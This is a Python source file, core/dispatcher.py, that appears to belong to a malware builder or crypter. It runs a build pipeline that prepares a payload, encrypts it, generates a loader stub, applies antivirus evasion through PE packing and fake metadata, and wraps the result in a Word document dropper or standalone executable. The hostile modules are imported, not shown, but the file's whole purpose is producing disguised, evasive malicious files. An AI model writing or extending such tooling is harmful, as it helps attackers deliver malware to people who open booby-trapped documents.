# core/dispatcher.py
import os
import sys
from datetime import datetime
from .logger import Logger
from modules.payloads.payload_preparer import PayloadPreparer
from modules.encryption.encryptor import EncryptionCoordinator
from modules.stub.stubgen import StubGenerator
from modules.evasion.pe_packer import PEPacker
from modules.evasion.metafaker import MetaFaker
from documents.word_dropper.generate_doc import WordDropperGenerator

class BuildDispatcher:
    def __init__(self, config, log_callback=None):
        self.config = config
        self.log_callback = log_callback or print
        self.logger = Logger()
        self.build_id = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.output_path = os.path.join(config['output_dir'], self.build_id)
        
    def log(self, message):
        self.logger.log(message)
        if self.log_callback:
            self.log_callback(message)
            
    def build_all(self):
        try:
            os.makedirs(self.output_path, exist_ok=True)
            
            self.log("Phase 1: Payload preparation...")
            payload_data = self._prepare_payload()
            
            self.log("Phase 2: Encryption...")
            encrypted_data, keys = self._encrypt_payload(payload_data)
            
            self.log("Phase 3: Stub generation...")
            stub_path = self._generate_stub(encrypted_data, keys)
            
            self.log("Phase 4: Evasion techniques...")
            final_stub = self._apply_evasion(stub_path)
            
            self.log("Phase 5: Document generation...")
            final_output = self._generate_document(final_stub)
            
            self.log("Build completed successfully!")
            return True, final_output
            
        except Exception as e:
            self.log(f"Build failed: {str(e)}")
            return False, None
            
    def _prepare_payload(self):
        preparer = PayloadPreparer()
        return preparer.prepare(self.config['payload_path'])
        
    def _encrypt_payload(self, payload_data):
        coordinator = EncryptionCoordinator(self.config['encryption_method'])
        return coordinator.encrypt_payload(payload_data)
        
    def _generate_stub(self, encrypted_data, keys):
        generator = StubGenerator(self.config['evasion_level'])
        return generator.generate_stub(encrypted_data, keys, self.output_path)
        
    def _apply_evasion(self, stub_path):
        if self.config['evasion_level'] in ['High', 'Maximum']:
            packer = PEPacker()
            packed_path = packer.pack(stub_path)
            
            faker = MetaFaker()
            return faker.add_fake_metadata(packed_path)
        return stub_path
        
    def _generate_document(self, stub_path):
        if self.config['target_format'] == 'Word Document':
            generator = WordDropperGenerator()
            return generator.generate(stub_path, self.output_path)
        elif self.config['target_format'] == 'Standalone EXE':
            return stub_path
        else:
            # Autres formats...
            return stub_path
